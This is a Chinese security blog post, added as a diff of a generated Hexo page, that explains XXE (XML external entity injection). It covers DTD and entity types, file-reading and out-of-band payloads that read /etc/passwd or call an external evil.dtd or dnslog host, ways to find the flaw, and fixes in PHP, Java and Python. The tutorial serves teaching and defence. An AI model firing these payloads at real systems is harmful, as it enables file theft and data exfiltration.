@@ -1,0 +1,515 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。  一、基础知识1、xmlXML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析xxe漏洞攻防">
+<meta property="og:url" content="http://example.com/2022/10/25/%E6%B5%85%E6%9E%90xxe%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/index.html">
+<meta property="og:site_name" content="verf1sh&#39;blog">
+<meta property="og:description" content="XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。  一、基础知识1、xmlXML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/14273/Downloads/37fa93b79ecd560e39eb16791f42899c.jpg">
+<meta property="og:image" content="c:/Users/14273/Downloads/image.png">
+<meta property="article:published_time" content="2022-10-25T09:15:13.000Z">
+<meta property="article:modified_time" content="2023-10-25T08:52:52.060Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:/Users/14273/Downloads/37fa93b79ecd560e39eb16791f42899c.jpg">
+  
+  <title>浅析xxe漏洞攻防 - verf1sh&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>verf1sh&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="浅析xxe漏洞攻防">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-10-25 17:15" pubdate>
+        2022年10月25日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.2k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      10 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">浅析xxe漏洞攻防</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
+</blockquote>
+<h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1、xml"><a href="#1、xml" class="headerlink" title="1、xml"></a>1、xml</h3><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML声明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><br><span class="hljs-comment">&lt;!--DTD，这部分可选的--&gt;</span>          <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [ </span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span>                                                                 <br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2、DTD"><a href="#2、DTD" class="headerlink" title="2、DTD"></a>2、DTD</h3><p>DTD（Document Type Definition）即文档类型定义，作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<p>DTD一般认为有两种引用或声明方式：</p>
+<ul>
+<li><p>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</p>
+</li>
+<li><p>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</p>
+</li>
+</ul>
+<p>DTD实体有以下几种声明方式</p>
+<h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note [<br>    &lt;!ENTITY a &quot;admin&quot;&gt;<br>]&gt;<br>&lt;note&gt;&amp;a&lt;/note&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>]&gt;<br>&lt;note&gt;&amp;b&lt;/note&gt;<br></code></pre></td></tr></table></figure>
+
+<p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p>
+<p>![image (1)](C:\Users\14273\Downloads\image (1).png)</p>
+<p>php安装扩展后还能支持的一些协议：</p>
+<p><img src="C:\Users\14273\Downloads\37fa93b79ecd560e39eb16791f42899c.jpg" srcset="/img/loading.gif" lazyload alt="37fa93b79ecd560e39eb16791f42899c"></p>
+<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY % c &quot;&lt;!ENTITY c1 &quot;awsl&quot;&gt;&quot;&gt;<br>    %a;<br>]&gt;<br>&lt;note&gt;&amp;c1&lt;/note&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li>
+<li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li>
+</ul>
+<h4 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY % d SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;<br>    %d;<br>]&gt;<br>&lt;note&gt;&amp;d1&lt;/note&gt;<br></code></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!-- http://xx.xx.xx.xx/xml.dtd --&gt;<br>&lt;!ENTITY d1 SYSTEM &quot;file:///etc/passwd&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="二、XXE-XML-External-Entity-漏洞利用"><a href="#二、XXE-XML-External-Entity-漏洞利用" class="headerlink" title="二、XXE(XML External Entity)漏洞利用"></a>二、XXE(XML External Entity)漏洞利用</h2><h3 id="1、任意文件读取"><a href="#1、任意文件读取" class="headerlink" title="1、任意文件读取"></a>1、任意文件读取</h3><p>最简单也是最常用的利用方式<br>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。</p>
+<h4 id="直接读取"><a href="#直接读取" class="headerlink" title="直接读取"></a>直接读取</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">verf1sh</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">test</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">&quot;file:///d:/phpstudy_pro/www/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>verf1sh<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="带外测试"><a href="#带外测试" class="headerlink" title="带外测试"></a>带外测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; ?&gt;<br>&lt;!DOCTYPE test [<br>    &lt;!ENTITY % file SYSTEM &quot;http://k6hipq.dnslog.cn&quot;&gt;<br>    %file;<br>]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;verf1sh&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="外部引用实体dtd"><a href="#外部引用实体dtd" class="headerlink" title="外部引用实体dtd"></a>外部引用实体dtd</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; ?&gt;<br>&lt;!DOCTYPE test [<br>    &lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:8081/evil2.dtd&quot;&gt;<br>    %file;<br>]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;verf1sh&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">evil2.dtd：<br>&lt;!ENTITY send SYSTEM &quot;file:///etc/passwd&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="三、XXE挖掘思路"><a href="#三、XXE挖掘思路" class="headerlink" title="三、XXE挖掘思路"></a>三、XXE挖掘思路</h2><h3 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h3><p>​    1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p>
+<p>​    2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p>
+<p>​    3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</p>
+<h3 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="XXE白盒发现："></a>XXE白盒发现：</h3><p>​    1、可通过应用功能追踪代码定位审计</p>
+<p>​    2、可通过脚本特定函数搜索定位审计</p>
+<p>​    3、可通过伪协议玩法绕过相关修复等</p>
+<h2 id="XXE修复方案"><a href="#XXE修复方案" class="headerlink" title="XXE修复方案"></a>XXE修复方案</h2><h3 id="方案1-禁用外部实体"><a href="#方案1-禁用外部实体" class="headerlink" title="方案1-禁用外部实体"></a>方案1-禁用外部实体</h3><blockquote>
+<p>PHP</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>JAVA</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-keyword">false</span>);<br></code></pre></td></tr></table></figure>
+
+<p>Python：</p>
+<p>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
+<h3 id="方案2-过滤用户提交的XML数据"><a href="#方案2-过滤用户提交的XML数据" class="headerlink" title="方案2-过滤用户提交的XML数据"></a>方案2-过滤用户提交的XML数据</h3><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>
+<p><img src="C:\Users\14273\Downloads\image.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php反序列化入门</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/25/XX%E7%89%B9%E6%8B%9B%E5%A4%8D%E4%B9%A0/">
+                        <span class="hidden-mobile">XX特招复习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
